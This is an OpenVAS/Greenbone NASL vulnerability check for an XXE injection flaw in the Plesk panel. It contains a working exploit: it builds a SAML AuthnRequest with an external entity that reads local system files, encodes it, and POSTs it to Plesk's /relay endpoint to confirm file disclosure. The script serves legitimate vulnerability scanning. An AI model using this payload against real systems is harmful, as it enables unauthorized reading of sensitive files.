##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_plesk_xxe_06_13.nasl 11831 2018-10-11 07:49:24Z jschulte $
#
# Plesk XXE Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:parallels:parallels_plesk_panel";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105046");
  script_version("$Revision: 11831 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_name("Plesk XXE Injection Vulnerability");

  script_xref(name:"URL", value:"http://makthepla.net/blog/=/plesk-sso-xxe-xss");

  script_tag(name:"last_modification", value:"$Date: 2018-10-11 09:49:24 +0200 (Thu, 11 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-06-13 14:56:42 +0200 (Fri, 13 Jun 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_plesk_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8443);
  script_mandatory_keys("plesk/installed");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to retrieve arbitrary files
  from the vulnerable system or to execute code in the context of the affected application.");
  script_tag(name:"vuldetect", value:"Send a special crafted HTTP POST request and check the response.");
  script_tag(name:"solution", value:"Ask the vendor for an update.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Plesk is prone to a XXE Vulnerability.");
  script_tag(name:"affected", value:"Plesk versions 10.4.4 and 11.0.9. Other versions may also be affected.");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");
include("url_func.inc");

if ( ! port = get_app_port( cpe:CPE ) ) exit( 0 );

files = traversal_files();
vtstring = get_vt_string();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  xxe = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE doc [ <!ENTITY xxe SYSTEM "file:///' + file + '"> ] >' +
        '<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"' +
        'ID="' +  rand_str( length:42, charset:'a-f0-9')  + '" Version="2.0">' +
        '<saml:Issuer>&xxe;</saml:Issuer></samlp:AuthnRequest>';

  xxe = urlencode( str:base64( str:xxe ) );
  useragent = get_http_user_agent();
  host = http_host_name(port:port);

  rs = urlencode( str:base64( str:get_host_ip() ) );

  ex = 'SAMLRequest=' + xxe  + '&response_url=http://' + vtstring + '&RelayState=' + rs  + '&RefererScheme=https&RefererHost=https://' + host + '&RefererPort=' + port;

  len = strlen( ex );

  req = 'POST /relay HTTP/1.1\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Host: ' + host + '\r\n' +
        'Accept: */*\r\n' +
        'Referer: https://' + host + '/relay\r\n' +
        'Content-Length: ' + len + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        '\r\n' +
        ex;
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if( egrep( string:buf, pattern:pattern ) )
  {
    security_message( data:"The target was found to be vulnerable.", port:port );
    exit( 0 );
  }
}

exit( 99 );
